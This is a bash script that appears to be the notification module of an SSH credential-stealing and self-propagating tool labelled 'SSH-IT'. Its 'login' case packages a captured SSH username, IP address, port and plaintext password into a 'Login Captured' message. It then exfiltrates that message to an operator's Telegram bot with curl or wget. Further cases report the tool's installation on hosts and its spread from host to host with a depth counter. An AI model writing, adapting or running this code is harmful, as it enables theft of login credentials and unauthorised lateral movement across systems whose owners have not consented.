#! /usr/bin/env bash

BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
source "${BINDIR}/funcs" 2>/dev/null || exit 254

if [[ -f "${THC_BASEDIR}/telegram.cfg" ]]; then
    source "${THC_BASEDIR}/telegram.cfg"
elif [[ -f "${BINDIR}/telegram.cfg" ]]; then
    source "${BINDIR}/telegram.cfg"
fi

[[ -z $TELEGRAM_BOT_TOKEN ]] && exit 0
[[ -z $TELEGRAM_CHAT_ID ]] && exit 0
[[ "$TELEGRAM_ENABLED" != "1" ]] && exit 0

send_telegram_message() {
    local message="$1"
    local bot_token="$TELEGRAM_BOT_TOKEN"
    local chat_id="$TELEGRAM_CHAT_ID"

    if command -v curl &>/dev/null; then
        curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d "chat_id=${chat_id}" \
            -d "text=${message}" \
            -d "parse_mode=HTML" \
            --max-time 10 &>/dev/null
    elif command -v wget &>/dev/null; then
        wget -qO- --timeout=10 \
            --post-data="chat_id=${chat_id}&text=${message}&parse_mode=HTML" \
            "https://api.telegram.org/bot${bot_token}/sendMessage" &>/dev/null
    fi
    return 0
}

notify_type="$1"

case "$notify_type" in
    "login")
        uname_info="${2:-unknown}"
        ssh_ip="${3:-unknown}"
        ssh_port="${4:-22}"
        ssh_user="${5:-unknown}"
        ssh_host="${6:-unknown}"
        ssh_password="${7:-KeyAuth}"

        if [[ "$ssh_password" = "KeyAuth" ]] || [[ -z "$ssh_password" ]]; then
            pass_display="Key Authentication"
        else
            pass_display="${ssh_password}"
        fi

        if [[ "$ssh_port" = "22" ]]; then
            ssh_cmd="ssh ${ssh_user}@${ssh_ip}"
        else
            ssh_cmd="ssh ${ssh_user}@${ssh_ip} -p ${ssh_port}"
        fi

        message="...:::: SSH-IT Login Captured ::::...
    <code>${uname_info}</code>

<b>ip address:</b> <code>${ssh_ip}</code>
<b>port:</b> <code>${ssh_port}</code>
<b>user:</b> <code>${ssh_user}</code>
<b>pass:</b> <code>${pass_display}</code>

<pre>${ssh_cmd}</pre>"

        send_telegram_message "$message"
        ;;

    "deploy")
        local_host="${2:-unknown}"
        target_host="${3:-unknown}"
        depth="${4:-0}"

        message="SSH-IT Deployed

From: <code>${local_host}</code>
To: <code>${target_host}</code>
Depth: <code>${depth}</code>"

        send_telegram_message "$message"
        ;;

    "install")
        local_host="${2:-unknown}"
        install_dir="${3:-unknown}"

        message="SSH-IT Installed

Host: <code>${local_host}</code>
Dir: <code>${install_dir}</code>"

        send_telegram_message "$message"
        ;;

    "test")
        message="SSH-IT Telegram Test OK"
        send_telegram_message "$message"
        ;;

    *)
        exit 1
        ;;
esac

exit 0
